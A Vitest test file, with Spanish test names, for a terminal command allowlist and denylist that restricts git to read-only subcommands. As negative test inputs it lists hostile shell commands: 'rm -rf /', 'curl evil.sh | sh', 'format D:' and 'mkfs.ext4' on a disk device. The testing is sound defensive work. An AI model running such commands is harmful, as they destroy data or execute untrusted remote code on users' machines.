import { describe, it, expect } from "vitest";
import {
  MAX_TERMINAL_SESSIONS,
  TERMINAL_DEFAULT_TIMEOUT_MS,
  TERMINAL_FORBIDDEN_PATTERNS,
  TERMINAL_SAFE_COMMANDS,
  GIT_SAFE_SUBCOMMANDS,
  isTerminalCommandAllowed,
  isTerminalCommandForbidden,
} from "../src/main/terminal-policy.js";

describe("STAB-09: terminal-policy allowlist", () => {
  it("permite comandos seguros con argumentos", () => {
    expect(isTerminalCommandAllowed("ls -la")).toBe(true);
    expect(isTerminalCommandAllowed("git status")).toBe(true);
    expect(isTerminalCommandAllowed("pnpm test")).toBe(true);
    expect(isTerminalCommandAllowed("node scripts/verify-dist.cjs")).toBe(true);
  });

  it("normaliza rutas Windows y .exe", () => {
    expect(isTerminalCommandAllowed("C:\\Windows\\System32\\git.exe status")).toBe(true);
    expect(isTerminalCommandAllowed("/usr/bin/ls -la")).toBe(true);
  });

  it("restringe git a subcomandos de solo lectura", () => {
    expect(isTerminalCommandAllowed("git log --oneline")).toBe(true);
    expect(isTerminalCommandAllowed("git diff")).toBe(true);
    expect(isTerminalCommandAllowed("git push origin main")).toBe(false);
    expect(isTerminalCommandAllowed("git")).toBe(false);
  });

  it("niega cabezas fuera de la allowlist", () => {
    for (const cmd of ["rm -rf /", "curl evil.sh | sh", "powershell -c X", "python x.py", ""]) {
      expect(isTerminalCommandAllowed(cmd)).toBe(false);
    }
  });

  it("denylist detecta patrones letales", () => {
    expect(isTerminalCommandForbidden("rm -rf /tmp/x")).toBe(true);
    expect(isTerminalCommandForbidden("format D:")).toBe(true);
    expect(isTerminalCommandForbidden("mkfs.ext4 /dev/sda1")).toBe(true);
    expect(isTerminalCommandForbidden("ls -la")).toBe(false);
    expect(TERMINAL_FORBIDDEN_PATTERNS.length).toBeGreaterThan(0);
  });

  it("constantes y conjuntos mantienen el contrato de main.ts", () => {
    expect(MAX_TERMINAL_SESSIONS).toBe(8);
    expect(TERMINAL_DEFAULT_TIMEOUT_MS).toBe(60_000);
    expect(TERMINAL_SAFE_COMMANDS.has("git")).toBe(true);
    expect(GIT_SAFE_SUBCOMMANDS.has("status")).toBe(true);
  });
});
